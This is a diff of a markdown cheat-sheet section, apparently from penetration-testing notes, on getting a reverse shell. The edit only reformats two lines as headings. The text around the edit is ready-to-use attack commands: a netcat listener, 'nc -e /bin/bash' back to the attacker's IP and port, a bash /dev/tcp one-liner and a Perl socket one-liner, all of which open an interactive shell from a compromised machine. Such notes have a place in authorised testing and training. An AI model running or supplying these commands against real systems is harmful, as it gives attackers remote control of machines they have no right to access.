@@ -1,9 +1,9 @@
 ## getting a reverse shell:-
-Try using netcat as follows:-
+### Try using netcat as follows:-
 1. on your attacker machine set up a listener by:- nc -lvp "port"
 2. on the compromised machine connect with the listener and spawn by:- shell nc -e /bin/bash "attacking machine IP" "port"
 
-If netcat doesnt work then use netcat to set up listener in the attacker machine via netcat and use the following to get a reverse shell back
+### If netcat doesnt work then use netcat to set up listener in the attacker machine via netcat and use the following to get a reverse shell back
 /bin/bash -i >& /dev/tcp/IP/PORT 0>&1 (via bash)<br />
 or<br />
 perl -e 'use Socket;$i="IP";$p="PORT";socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};' (via perl)<br />
